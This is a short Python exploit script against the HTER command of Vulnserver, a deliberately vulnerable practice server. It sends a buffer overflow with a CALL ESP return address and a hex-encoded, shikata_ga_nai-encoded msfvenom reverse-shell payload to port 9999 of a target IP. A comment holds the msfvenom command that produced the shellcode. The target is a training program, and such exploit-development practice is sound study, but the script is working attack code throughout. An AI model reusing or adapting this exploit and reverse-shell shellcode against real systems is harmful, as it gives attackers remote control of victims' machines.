#########################################################################################
# Title: Vulnserver HTER command exploit
# Author: Marco Lugo
# Description: execute payload (in HEX format, avoiding null byte)
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os

#call_esp = struct.pack('<I', 0x7C82385D)
call_esp = '5D38827C'

target_ip = sys.argv[1]
buffer = 'HTER '
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f hex
payload = '43f9f92f914a484141273f92f9f9439b424843f5daccb8f43f6601d97424f45a31c9b15231421783eafc03b62c84f4cabbcaf7323cab7ed70debe59c3edb6ef0b29023e041d4eb07e153ca26f2c82e297013638949dc76c88e017a98474d290ce31bf2a7bf8a725477ac53cb03f773eac0833df405a9f48ffe450759cfa6a4a4ff54b4e13887c31b3b3ad4d841e051fae263c12612a794ad180cd2e93c9337823918b644c85a9d409039bcd17cefc101df50644af28515119b6a14a95be52fda69aa9b74c2230283251ef21bd8a103321ff5532cb67638ac37a3effc971c50ac57cd38a6573258c9bd5bf330561b043aa78b063ab6178edcd2b7c6774b214303eaae596e2c246e8fe3cd1b83943d56f933414c95d8d00b6596c88332ff3fdad6ed6674c4efffbf4c343c414db978655d07802109d7d7ffe79181b151487d18350d4d9b4312986daba37528d40c12bcad7082436431b20924105bd4bd2006e768663f649817c474e9128032026f99d624dc9af2'
pattern = 'A' * 2041 + call_esp + payload + 'C' * (1000 - len(payload))
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()
